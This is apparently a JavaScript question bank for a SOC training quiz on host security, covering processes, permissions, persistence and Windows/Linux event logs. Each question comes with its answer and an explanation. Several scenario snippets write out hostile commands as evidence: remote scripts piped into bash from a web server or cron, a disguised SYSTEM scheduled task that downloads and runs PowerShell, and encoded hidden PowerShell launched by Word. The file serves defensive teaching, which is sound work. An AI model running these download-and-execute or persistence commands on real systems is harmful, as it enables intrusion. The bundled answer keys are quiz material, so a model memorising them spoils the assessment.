// Host basics questions.
//
// Question format (see README "Adding questions"):
//   id          unique id, e.g. 'hp-09'
//   skill       id of a skill in content/skills.js
//   difficulty  1 (easy) .. 3 (hard)
//   type        'mc' (one answer), 'multi' (select all that apply), 'text' (typed answer)
//   prompt      the question
//   snippet     optional log / command output shown in a code box (mini-scenario)
//   choices     for mc and multi
//   answer      mc: the exact text of the correct choice; multi: array of correct choices
//   accept      text: array of accepted answers (compared case-insensitively, trimmed)
//   explanation shown after answering: why the right answer is right and why the
//               tempting wrong answers are wrong
//
// Note: IP addresses in scenarios use the reserved documentation ranges
// (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) so they never point at real hosts.

export const HOST_ITEMS = [
  // ===================== OS fundamentals & processes =====================
  {
    id: 'hp-01',
    skill: 'host-processes',
    difficulty: 1,
    type: 'mc',
    prompt: 'What is a process?',
    choices: [
      'A running instance of a program, with its own memory and a process ID (PID)',
      'An executable file stored on disk',
      'A user account that runs in the background',
      'A network connection between two computers',
    ],
    answer: 'A running instance of a program, with its own memory and a process ID (PID)',
    explanation:
      'A program is the file on disk (for example `notepad.exe`). A process is that program loaded into memory and running, tracked by the operating system with a unique PID. One program can have many processes at once. Accounts own processes and processes can open network connections, but neither of those is a process itself.',
  },
  {
    id: 'hp-02',
    skill: 'host-processes',
    difficulty: 1,
    type: 'text',
    prompt: 'On Linux, what is the PID of init/systemd, the first user-space process and the ancestor of all others?',
    accept: ['1', 'pid 1', 'pid1'],
    explanation:
      'The kernel starts init (on most modern distros that is systemd) as PID 1, and every other user-space process descends from it. If a process\'s parent dies, it is usually re-parented to PID 1. PID 0 is not a normal process you will see in `ps`.',
  },
  {
    id: 'hp-03',
    skill: 'host-processes',
    difficulty: 1,
    type: 'text',
    prompt: 'Which Linux command lists running processes and is commonly run with the options "aux"?',
    accept: ['ps', 'ps aux', 'ps -aux', 'ps -ef'],
    explanation:
      '`ps aux` shows every process with its user, PID, CPU/memory use and full command line. (`ps -ef` is the other common style and shows the parent PID, PPID.) `top`/`htop` are live views, but the command used with "aux" is `ps`.',
  },
  {
    id: 'hp-04',
    skill: 'host-processes',
    difficulty: 2,
    type: 'mc',
    prompt: 'On Windows, which process is the legitimate parent of service host processes such as svchost.exe?',
    choices: ['services.exe', 'explorer.exe', 'wininit.exe', 'lsass.exe'],
    answer: 'services.exe',
    explanation:
      'svchost.exe instances are started by services.exe (the Service Control Manager). wininit.exe is the parent of services.exe and lsass.exe, one level higher. An svchost.exe whose parent is explorer.exe (the user\'s desktop shell) or anything else is a classic sign of malware pretending to be a system process.',
  },
  {
    id: 'hp-05',
    skill: 'host-processes',
    difficulty: 2,
    type: 'multi',
    prompt: 'Which of these are red flags for a process calling itself "svchost.exe"? Select all that apply.',
    choices: [
      'It is running from C:\\Users\\Public\\svchost.exe',
      'Its parent process is explorer.exe',
      'The file name is actually "svch0st.exe" (a zero instead of the letter o)',
      'Several svchost.exe processes are running at the same time',
      'It is located in C:\\Windows\\System32',
    ],
    answer: [
      'It is running from C:\\Users\\Public\\svchost.exe',
      'Its parent process is explorer.exe',
      'The file name is actually "svch0st.exe" (a zero instead of the letter o)',
    ],
    explanation:
      'The real svchost.exe lives in C:\\Windows\\System32 and is started by services.exe, so a wrong folder, a wrong parent, or a look-alike name are all warning signs. Seeing many svchost.exe processes is completely normal: Windows runs a separate one for each group of services.',
  },
  {
    id: 'hp-06',
    skill: 'host-processes',
    difficulty: 2,
    type: 'mc',
    prompt: 'An EDR tool shows this process tree on a user\'s laptop. What is the most concerning part?',
    snippet: String.raw`WINWORD.EXE  (PID 4120)
 └─ cmd.exe  (PID 5288)
      /c powershell -nop -w hidden -enc JABjAGwAaQBlAG4AdAA...
     └─ powershell.exe  (PID 5304)`,
    choices: [
      'Word spawned a command shell that launched hidden, encoded PowerShell — a classic malicious macro pattern',
      'PowerShell should never run on a Windows computer',
      'PIDs above 5000 indicate malware',
      'cmd.exe is supposed to be the parent of WINWORD.EXE, not the child',
    ],
    answer:
      'Word spawned a command shell that launched hidden, encoded PowerShell — a classic malicious macro pattern',
    explanation:
      'Office apps rarely need to start cmd.exe or PowerShell. Add `-w hidden` (no window) and `-enc` (Base64-encoded command) and this is the textbook pattern of a malicious macro in a phishing document. PowerShell itself is a legitimate admin tool, and PID numbers are just counters with no meaning about safety.',
  },
  {
    id: 'hp-07',
    skill: 'host-processes',
    difficulty: 3,
    type: 'mc',
    prompt: 'You see this in `ps -ef` style output on a Linux web server. What does it most likely indicate?',
    snippet: `USER      PID   PPID  CMD
www-data  2211  1873  /usr/sbin/apache2 -k start
www-data  3190  2211  sh -c curl -s http://203.0.113.50/x.sh | bash`,
    choices: [
      'The web server spawned a shell that downloads and runs a script — possible web shell or remote code execution',
      'Normal Apache log rotation',
      'An administrator updating Apache through the package manager',
      'The www-data user logging in over SSH',
    ],
    answer:
      'The web server spawned a shell that downloads and runs a script — possible web shell or remote code execution',
    explanation:
      'PPID 2211 is the apache2 process, so the web server itself started `sh`, which pipes a remote script straight into bash. Web servers should not be launching shells. Log rotation runs from cron/logrotate, package updates run as root through apt, and an SSH login would come from sshd, not apache2.',
  },
  {
    id: 'hp-08',
    skill: 'host-processes',
    difficulty: 3,
    type: 'mc',
    prompt: 'Why do attackers so often try to dump the memory of lsass.exe on Windows?',
    choices: [
      'It holds credential material for logged-on users, such as NTLM password hashes and Kerberos tickets',
      'It controls the Windows Firewall',
      'It is the parent process of every user program',
      'It stores the Windows event logs',
    ],
    answer:
      'It holds credential material for logged-on users, such as NTLM password hashes and Kerberos tickets',
    explanation:
      'lsass.exe (Local Security Authority Subsystem Service) handles logons and caches credentials in memory. Tools like Mimikatz read that memory to steal hashes and tickets for lateral movement. The firewall is a service, user programs normally descend from explorer.exe, and event logs are handled by the EventLog service.',
  },

  // ===================== Users, groups & permissions =====================
  {
    id: 'hu-01',
    skill: 'host-users',
    difficulty: 1,
    type: 'mc',
    prompt: 'A Linux file shows the permissions -rwxr-x---. What can members of the file\'s group do?',
    choices: ['Read and execute', 'Read, write and execute', 'Nothing', 'Read only'],
    answer: 'Read and execute',
    explanation:
      'After the first character (file type), permissions come in three sets of three: owner `rwx`, group `r-x`, others `---`. So the group can read and execute but not write, and everyone else gets nothing.',
  },
  {
    id: 'hu-02',
    skill: 'host-users',
    difficulty: 1,
    type: 'text',
    prompt: 'On Linux, what is the name of the all-powerful account with UID 0?',
    accept: ['root', 'the root user', 'root user', 'superuser'],
    explanation:
      'root (UID 0) can do anything on the system. The kernel checks the UID, not the name, so any account with UID 0 has root power — which is why a second UID 0 account is a big red flag.',
  },
  {
    id: 'hu-03',
    skill: 'host-users',
    difficulty: 2,
    type: 'text',
    prompt: 'What is the octal (numeric) form of the permissions rwxr-xr-x? (Type the three digits.)',
    accept: ['755', '0755'],
    explanation:
      'Each set is added up with r=4, w=2, x=1. Owner rwx = 4+2+1 = 7, group r-x = 4+1 = 5, others r-x = 5. So `chmod 755` gives rwxr-xr-x, typical for programs and directories.',
  },
  {
    id: 'hu-04',
    skill: 'host-users',
    difficulty: 1,
    type: 'mc',
    prompt: 'A help-desk employee\'s account has been placed in Domain Admins "just in case". Which security principle does this violate?',
    choices: ['Least privilege', 'Non-repudiation', 'High availability', 'Data integrity'],
    answer: 'Least privilege',
    explanation:
      'Least privilege means every account gets only the access it needs to do its job. An over-privileged account turns one phished password into a domain-wide compromise. Non-repudiation is about proving who did something, availability is about uptime, and integrity is about data not being altered.',
  },
  {
    id: 'hu-05',
    skill: 'host-users',
    difficulty: 2,
    type: 'mc',
    prompt: 'What does Windows User Account Control (UAC) do?',
    choices: [
      'Runs administrators with a standard-user token until they approve an elevation prompt',
      'Encrypts every user\'s files automatically',
      'Stops administrator accounts from logging in',
      'Guarantees that malware cannot run',
    ],
    answer: 'Runs administrators with a standard-user token until they approve an elevation prompt',
    explanation:
      'With UAC, even an admin\'s programs start with limited rights; the full admin token is only used after the "Do you want to allow this app to make changes?" prompt. It reduces damage from accidental or silent execution, but it is not encryption (that is BitLocker/EFS) and it is not a guarantee against malware — attackers have UAC bypass techniques.',
  },
  {
    id: 'hu-06',
    skill: 'host-users',
    difficulty: 2,
    type: 'mc',
    prompt: 'You review /etc/passwd on a Linux server. What is suspicious?',
    snippet: `root:x:0:0:root:/root:/bin/bash
alice:x:1001:1001:Alice:/home/alice:/bin/bash
backup2:x:0:0::/home/backup2:/bin/bash`,
    choices: [
      'backup2 has UID 0, giving it root-level privileges',
      'The "x" means passwords are stored in plain text',
      'alice has a UID above 1000',
      'root uses /bin/bash as its shell',
    ],
    answer: 'backup2 has UID 0, giving it root-level privileges',
    explanation:
      'The third field is the UID. backup2 has UID 0, so it is effectively a second root account — a common backdoor. The `x` means the password hash is stored in /etc/shadow (not plain text), regular users normally start at UID 1000, and bash is a normal shell for root.',
  },
  {
    id: 'hu-07',
    skill: 'host-users',
    difficulty: 2,
    type: 'multi',
    prompt: 'New members in which Windows groups should a SOC analyst treat as high-risk and verify? Select all that apply.',
    choices: ['Administrators', 'Domain Admins', 'Enterprise Admins', 'Users', 'Guests'],
    answer: ['Administrators', 'Domain Admins', 'Enterprise Admins'],
    explanation:
      'Administrators (local admin on a machine), Domain Admins (admin across the domain) and Enterprise Admins (admin across the whole forest) are privileged groups attackers add themselves to. Users is the normal group everyone is in, and Guests is a very limited group.',
  },
  {
    id: 'hu-08',
    skill: 'host-users',
    difficulty: 3,
    type: 'mc',
    prompt: 'A file owned by root shows the permissions -rwsr-xr-x. What does the "s" mean?',
    choices: [
      'SUID: the program runs with the file owner\'s (root\'s) privileges no matter who starts it',
      'The file is a network socket',
      'The sticky bit: only the owner can delete it',
      'The file has a valid digital signature',
    ],
    answer: 'SUID: the program runs with the file owner\'s (root\'s) privileges no matter who starts it',
    explanation:
      'An `s` in the owner execute position is the SUID bit. Legit examples include `passwd`, but an unexpected SUID-root binary (like a copy of bash) is a classic privilege-escalation backdoor. Sockets show as `s` in the first (file type) position, and the sticky bit shows as `t` in the others position.',
  },

  // ===================== File system & common paths =====================
  {
    id: 'hf-01',
    skill: 'host-filesystem',
    difficulty: 1,
    type: 'mc',
    prompt: 'On Linux, where are system-wide configuration files usually stored?',
    choices: ['/etc', '/bin', '/home', '/tmp'],
    answer: '/etc',
    explanation:
      '/etc holds configuration such as /etc/passwd, /etc/ssh/sshd_config and /etc/crontab. /bin holds essential programs, /home holds users\' personal folders, and /tmp is scratch space that anyone can write to.',
  },
  {
    id: 'hf-02',
    skill: 'host-filesystem',
    difficulty: 1,
    type: 'mc',
    prompt: 'Which Linux directory is writable by every user and is a favorite place for attackers to drop tools?',
    choices: ['/tmp', '/etc', '/boot', '/usr/sbin'],
    answer: '/tmp',
    explanation:
      '/tmp (and /dev/shm and /var/tmp) are world-writable, so an attacker with a low-privilege foothold can write and run files there. /etc, /boot and /usr/sbin are writable only by root.',
  },
  {
    id: 'hf-03',
    skill: 'host-filesystem',
    difficulty: 1,
    type: 'mc',
    prompt: 'A file named ".x" in /tmp does not show up when you run plain `ls`. Why?',
    choices: [
      'Names that start with a dot are hidden; `ls -a` shows them',
      'The file is encrypted',
      'The file has already been deleted',
      'Files in /tmp are never listed',
    ],
    answer: 'Names that start with a dot are hidden; `ls -a` shows them',
    explanation:
      'On Linux any file or folder starting with `.` is hidden from a normal listing. Attackers use names like `.x` or `...` to stay out of sight, so analysts habitually use `ls -la`.',
  },
  {
    id: 'hf-04',
    skill: 'host-filesystem',
    difficulty: 2,
    type: 'text',
    prompt: 'On Windows, most core system programs (like cmd.exe) live in C:\\Windows\\______. Fill in the folder name.',
    accept: ['System32', 'C:\\Windows\\System32', 'Windows\\System32'],
    explanation:
      'C:\\Windows\\System32 holds core 64-bit system binaries such as cmd.exe, svchost.exe and lsass.exe. A "system" file running from anywhere else (Temp, Public, AppData) deserves a closer look.',
  },
  {
    id: 'hf-05',
    skill: 'host-filesystem',
    difficulty: 2,
    type: 'mc',
    prompt: 'On Linux, which file stores the password hashes?',
    choices: ['/etc/shadow', '/etc/passwd', '/var/log/auth.log', '/root/.bashrc'],
    answer: '/etc/shadow',
    explanation:
      '/etc/shadow holds the hashes and is readable only by root. /etc/passwd lists accounts (readable by everyone, which is why hashes moved out of it), auth.log records logins, and .bashrc is a shell startup script.',
  },
  {
    id: 'hf-06',
    skill: 'host-filesystem',
    difficulty: 2,
    type: 'text',
    prompt: 'What is the name of the hidden file in a Linux user\'s home directory that keeps their bash command history?',
    accept: ['.bash_history', '~/.bash_history', 'bash_history'],
    explanation:
      '~/.bash_history records commands a user typed, which makes it valuable evidence. Attackers know this too and often delete it, link it to /dev/null, or unset HISTFILE — a missing or empty history file can itself be a clue.',
  },
  {
    id: 'hf-07',
    skill: 'host-filesystem',
    difficulty: 2,
    type: 'mc',
    prompt: 'An EDR alert shows this file being executed. Why is the location notable?',
    snippet: String.raw`C:\Users\jsmith\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.exe`,
    choices: [
      'Anything in a user\'s Startup folder runs automatically every time that user logs on',
      'It is the Windows Update folder, so the file is trusted',
      'Windows automatically quarantines files in this folder',
      'This folder is only used for Office templates',
    ],
    answer: 'Anything in a user\'s Startup folder runs automatically every time that user logs on',
    explanation:
      'The Startup folder is a simple persistence spot: a user can write to it without admin rights, and its contents run at every logon. Windows Update does not live here, nothing is auto-quarantined, and Office templates are stored elsewhere.',
  },
  {
    id: 'hf-08',
    skill: 'host-filesystem',
    difficulty: 3,
    type: 'multi',
    prompt: 'Which Windows locations are commonly abused because standard (non-admin) users can write to them? Select all that apply.',
    choices: [
      'C:\\Users\\<user>\\AppData\\Local\\Temp',
      'C:\\Users\\Public',
      'C:\\ProgramData',
      'C:\\Windows\\System32',
      'C:\\Program Files',
    ],
    answer: ['C:\\Users\\<user>\\AppData\\Local\\Temp', 'C:\\Users\\Public', 'C:\\ProgramData'],
    explanation:
      'A user\'s Temp folder, C:\\Users\\Public and (by default) C:\\ProgramData all allow ordinary users to create files, so malware dropped without admin rights lands there. System32 and Program Files require administrator rights to write to.',
  },

  // ===================== Services & persistence =====================
  {
    id: 'hs-01',
    skill: 'host-persistence',
    difficulty: 1,
    type: 'mc',
    prompt: 'In an attack, what does "persistence" mean?',
    choices: [
      'Techniques that keep the attacker\'s access working across reboots, logoffs or password changes',
      'Repeatedly guessing passwords until one works',
      'Copying data out of the network',
      'Moving from one compromised host to another',
    ],
    answer: 'Techniques that keep the attacker\'s access working across reboots, logoffs or password changes',
    explanation:
      'Persistence is about staying in: services, scheduled tasks, Run keys, cron jobs, SSH keys and so on. Password guessing is brute force, copying data out is exfiltration, and hopping between hosts is lateral movement — different stages of an attack.',
  },
  {
    id: 'hs-02',
    skill: 'host-persistence',
    difficulty: 1,
    type: 'mc',
    prompt: 'On a Linux system using systemd, where could an attacker drop a unit file to create a service that starts at boot?',
    choices: ['/etc/systemd/system/', '/var/log/', '/proc/', '/dev/null'],
    answer: '/etc/systemd/system/',
    explanation:
      'Admin-created and override unit files live in /etc/systemd/system/ (users can also add their own in ~/.config/systemd/user/). /var/log holds logs, /proc is a virtual view of running processes, and /dev/null discards anything written to it.',
  },
  {
    id: 'hs-03',
    skill: 'host-persistence',
    difficulty: 2,
    type: 'text',
    prompt: 'Which Linux time-based job scheduler (edited with the `crontab` command) is commonly abused for persistence?',
    accept: ['cron', 'crontab', 'cron job', 'cron jobs', 'crond', 'cronjob'],
    explanation:
      'cron runs commands on a schedule from user crontabs, /etc/crontab and /etc/cron.d/. An entry like `*/5 * * * * curl http://... | bash` re-infects a box every five minutes. systemd timers are a newer alternative worth checking too.',
  },
  {
    id: 'hs-04',
    skill: 'host-persistence',
    difficulty: 2,
    type: 'multi',
    prompt: 'Which of these are common Windows persistence mechanisms? Select all that apply.',
    choices: [
      'A value under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
      'A scheduled task',
      'A newly installed service',
      'Clearing the DNS cache with ipconfig /flushdns',
      'Running ipconfig /all',
    ],
    answer: [
      'A value under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
      'A scheduled task',
      'A newly installed service',
    ],
    explanation:
      'Run keys start programs at logon, scheduled tasks run on triggers or timers, and services can start automatically at boot (often as SYSTEM). Flushing the DNS cache or viewing IP settings changes nothing that survives a reboot.',
  },
  {
    id: 'hs-05',
    skill: 'host-persistence',
    difficulty: 2,
    type: 'mc',
    prompt: 'This appears in a Windows System event log. What is most suspicious about it?',
    snippet: String.raw`Event ID 7045  A service was installed in the system.
Service Name:       WinUpdSvc
Service File Name:  C:\Users\Public\wupd.exe
Service Type:       user mode service
Service Start Type: auto start
Service Account:    LocalSystem`,
    choices: [
      'An auto-start service running as LocalSystem from a user-writable folder (C:\\Users\\Public)',
      'Event ID 7045 always means malware',
      '"user mode service" is not a valid service type',
      'Service names must begin with "Microsoft"',
    ],
    answer: 'An auto-start service running as LocalSystem from a user-writable folder (C:\\Users\\Public)',
    explanation:
      'Event 7045 records every new service; installers generate it legitimately, so the event alone is not proof. What stands out is the combination: a vague "update" name, a binary in C:\\Users\\Public, auto start, and the most powerful account (LocalSystem). Real services live under Program Files or System32.',
  },
  {
    id: 'hs-06',
    skill: 'host-persistence',
    difficulty: 3,
    type: 'mc',
    prompt: 'What does this command do?',
    snippet: `schtasks /create /sc minute /mo 5 /tn "GoogleUpdateTaskCore"
  /tr "powershell -w hidden -c iex(iwr http://198.51.100.7/a.ps1)"
  /ru SYSTEM`,
    choices: [
      'Creates a task that runs every 5 minutes as SYSTEM, downloading and executing a remote PowerShell script, disguised as a Google update task',
      'Updates Google Chrome every 5 minutes',
      'Deletes the scheduled task named GoogleUpdateTaskCore',
      'Runs PowerShell once at the next reboot',
    ],
    answer:
      'Creates a task that runs every 5 minutes as SYSTEM, downloading and executing a remote PowerShell script, disguised as a Google update task',
    explanation:
      '`/create /sc minute /mo 5` = new task every 5 minutes; `/ru SYSTEM` = run as SYSTEM; `iwr` (Invoke-WebRequest) downloads a script and `iex` (Invoke-Expression) runs it. The task name imitates real Google updater tasks to blend in. Nothing here deletes a task or runs only at boot.',
  },
  {
    id: 'hs-07',
    skill: 'host-persistence',
    difficulty: 3,
    type: 'multi',
    prompt: 'Which Linux files or locations can give an attacker persistence? Select all that apply.',
    choices: [
      '~/.bashrc',
      '~/.ssh/authorized_keys',
      '/etc/crontab',
      '/proc/cpuinfo',
      '/var/log/wtmp',
    ],
    answer: ['~/.bashrc', '~/.ssh/authorized_keys', '/etc/crontab'],
    explanation:
      '.bashrc runs every time the user opens an interactive shell, an attacker\'s public key in authorized_keys grants password-less SSH access, and /etc/crontab runs scheduled commands. /proc/cpuinfo is a read-only virtual file describing the CPU, and /var/log/wtmp is a login record (evidence, not persistence).',
  },

  // ===================== Host logs =====================
  {
    id: 'hl-01',
    skill: 'host-logs',
    difficulty: 1,
    type: 'mc',
    prompt: 'What does Windows Security Event ID 4625 mean?',
    choices: [
      'An account failed to log on',
      'An account was successfully logged on',
      'A user account was created',
      'A new process has been created',
    ],
    answer: 'An account failed to log on',
    explanation:
      '4625 = failed logon. Lots of them in a short time from one source suggests password guessing. For comparison: 4624 = successful logon, 4720 = user account created, 4688 = new process created.',
  },
  {
    id: 'hl-02',
    skill: 'host-logs',
    difficulty: 1,
    type: 'text',
    prompt: 'Which Windows Security Event ID records a successful logon?',
    accept: ['4624'],
    explanation:
      '4624 = "An account was successfully logged on." Its Logon Type field tells you how: 2 = at the keyboard, 3 = over the network (e.g. file share), 10 = Remote Desktop. Its partner 4625 is the failed logon.',
  },
  {
    id: 'hl-03',
    skill: 'host-logs',
    difficulty: 1,
    type: 'mc',
    prompt: 'On Debian/Ubuntu Linux, which log file records SSH logins and sudo use?',
    choices: ['/var/log/auth.log', '/var/log/dpkg.log', '/var/log/kern.log', '/var/log/apache2/access.log'],
    answer: '/var/log/auth.log',
    explanation:
      'auth.log records authentication: sshd logins (accepted and failed), sudo and su. On Red Hat-family systems the same information is in /var/log/secure. dpkg.log tracks package installs, kern.log kernel messages, and access.log web requests.',
  },
  {
    id: 'hl-04',
    skill: 'host-logs',
    difficulty: 2,
    type: 'mc',
    prompt: 'Which Windows Security Event ID is "A new process has been created"?',
    choices: ['4688', '4624', '4720', '4672'],
    answer: '4688',
    explanation:
      '4688 logs process creation (with the command line if that audit option is enabled), which is how you spot things like Word launching PowerShell. 4624 is a successful logon, 4720 a new user account, and 4672 special privileges assigned to a new logon.',
  },
  {
    id: 'hl-05',
    skill: 'host-logs',
    difficulty: 2,
    type: 'mc',
    prompt: 'What does Windows Security Event ID 4672 indicate?',
    choices: [
      'Special (admin-level) privileges were assigned to a new logon',
      'A user account was locked out',
      'The audit log was cleared',
      'An account failed to log on',
    ],
    answer: 'Special (admin-level) privileges were assigned to a new logon',
    explanation:
      '4672 appears right after a 4624 when the account that logged on has powerful privileges (for example an administrator or SYSTEM). It helps you see when privileged accounts are used. Lockouts are 4740, clearing the Security log is 1102, and a failed logon is 4625.',
  },
  {
    id: 'hl-06',
    skill: 'host-logs',
    difficulty: 2,
    type: 'mc',
    prompt: 'You pull these events from an internet-facing Windows server. What happened?',
    snippet: `08:14:02  4625  Account failed to log on   User: administrator
          Source IP: 203.0.113.44   Logon Type: 10
08:14:05  4625  (same user, same source)
   ... 214 more 4625 events in 3 minutes ...
08:17:11  4624  Account successfully logged on   User: administrator
          Source IP: 203.0.113.44   Logon Type: 10`,
    choices: [
      'A password-guessing (brute-force) attack over Remote Desktop that appears to have succeeded',
      'A user who forgot their password, which is harmless',
      'Windows Update authenticating to Microsoft',
      'A failed attack — no logon succeeded',
    ],
    answer: 'A password-guessing (brute-force) attack over Remote Desktop that appears to have succeeded',
    explanation:
      'Hundreds of 4625 failures from one external IP followed by a 4624 success from the same IP is brute force that worked. Logon Type 10 = RemoteInteractive, i.e. RDP. This should be escalated immediately: disable/reset the account and investigate what the attacker did after 08:17.',
  },
  {
    id: 'hl-07',
    skill: 'host-logs',
    difficulty: 2,
    type: 'mc',
    prompt: 'What is happening in this Linux /var/log/auth.log excerpt?',
    snippet: `Sep 25 03:12:44 web01 sshd[2231]: Failed password for invalid user oracle from 198.51.100.9 port 51422 ssh2
Sep 25 03:12:46 web01 sshd[2233]: Failed password for invalid user test from 198.51.100.9 port 51430 ssh2
Sep 25 03:12:49 web01 sshd[2235]: Failed password for root from 198.51.100.9 port 51436 ssh2`,
    choices: [
      'One IP is brute-forcing SSH, trying several usernames',
      'root successfully logged in over SSH',
      'A user misused sudo',
      'The server is rebooting',
    ],
    answer: 'One IP is brute-forcing SSH, trying several usernames',
    explanation:
      'Rapid "Failed password" lines from the same source, trying common names (oracle, test, root), is automated SSH guessing. "invalid user" means that username does not exist on the box. A successful login would say "Accepted password" or "Accepted publickey"; sudo activity shows up as `sudo:` lines.',
  },
  {
    id: 'hl-08',
    skill: 'host-logs',
    difficulty: 3,
    type: 'multi',
    prompt: 'To detect an attacker creating a new account and giving it admin rights, which Windows Security Event IDs would you look for? Select all that apply.',
    choices: [
      '4720 — A user account was created',
      '4732 — A member was added to a security-enabled local group',
      '4728 — A member was added to a security-enabled global group',
      '4625 — An account failed to log on',
      '4634 — An account was logged off',
    ],
    answer: [
      '4720 — A user account was created',
      '4732 — A member was added to a security-enabled local group',
      '4728 — A member was added to a security-enabled global group',
    ],
    explanation:
      '4720 shows the account being created; 4732 (local groups such as Administrators) and 4728 (domain global groups such as Domain Admins) show it being added to a privileged group. Failed logons and logoffs do not show account creation or privilege changes.',
  },
  {
    id: 'hl-09',
    skill: 'host-logs',
    difficulty: 3,
    type: 'mc',
    prompt: 'At 2:00 AM a file server logs Security Event ID 1102. Why is that concerning?',
    choices: [
      'The Security audit log was cleared, a common way for attackers to hide their tracks',
      'A scheduled backup finished successfully',
      'A user changed their password',
      'The server ran low on disk space',
    ],
    answer: 'The Security audit log was cleared, a common way for attackers to hide their tracks',
    explanation:
      '1102 = "The audit log was cleared." Legitimate clearing is rare and should be tied to a change ticket; at 2 AM with no ticket it strongly suggests anti-forensics. Check who cleared it (the event records the account) and pull logs from your SIEM, which still has copies.',
  },
];
